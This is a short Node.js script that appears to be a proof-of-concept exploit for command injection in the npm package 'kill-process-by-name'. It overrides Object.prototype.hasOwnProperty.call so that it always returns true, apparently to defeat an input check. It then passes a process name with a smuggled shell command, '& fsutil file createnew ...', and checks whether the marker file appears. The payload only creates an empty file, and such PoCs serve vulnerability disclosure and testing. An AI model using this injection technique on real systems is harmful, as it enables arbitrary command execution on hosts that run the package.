Object.prototype.hasOwnProperty.call = () => true;
const kill_process_by_name = require('kill-process-by-name');
const fs = require('fs');
const path = './kill-process-by-name';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
kill_process_by_name('& fsutil file createnew kill-process-by-name 0 &');
setTimeout(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, () => {
    });
}, 500);